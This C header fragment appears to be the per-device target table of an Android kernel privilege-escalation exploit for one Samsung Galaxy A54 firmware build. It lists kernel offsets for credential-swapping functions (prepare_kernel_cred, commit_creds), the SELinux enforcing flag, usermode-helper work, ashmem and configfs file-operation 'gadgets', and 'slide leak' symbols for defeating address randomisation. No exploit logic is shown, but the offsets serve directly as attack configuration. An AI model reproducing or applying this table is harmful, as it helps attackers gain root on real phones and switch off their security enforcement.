 ...
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "a54x-A546EXXSACXI3-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_MCAST

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a54xnsxx/a54x:14/UP1A.231005.007/A546EXXSACXI3:user/release-keys"
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/a54x-A546EXXSACXI3/p0_fingerprint.h"
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00106718ULL
 ...
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK_OFF             0x0221f600ULL
#define PREPARE_KERNEL_CRED_OFF   0x00111a58ULL
#define COMMIT_CREDS_OFF          0x00111300ULL
#define OVERRIDE_CREDS_OFF        0x001116e8ULL
#define ROOT_TASK_GROUP_OFF       0x023fcf80ULL
#define SELINUX_ENFORCING_OFF     0x024d0130ULL
#define KMALLOC_CACHES_OFF        0x019df130ULL
#define ANON_PIPE_BUF_OPS_OFF     0x018007a0ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x0220ae10ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000ff0e0ULL

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_FOPS_OFF           0x0198fb40ULL
#define ASHMEM_MISC_FOPS_OFF      0x02372710ULL
#define ASHMEM_IOCTL_OFF          0x00c45908ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x003c3c5cULL
#define ASHMEM_MMAP_OFF           0x00c45f18ULL
#define ASHMEM_OPEN_OFF           0x00c46154ULL
#define ASHMEM_RELEASE_OFF        0x00c461d8ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00c462f8ULL
#define CONFIGFS_READ_ITER_OFF    0x0046af54ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046b410ULL
#define COPY_SPLICE_READ_OFF      0x003f2ad4ULL
#define NOOP_LLSEEK_OFF           0x003a82b0ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01702c4bULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02212490ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02574241ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02574241ULL
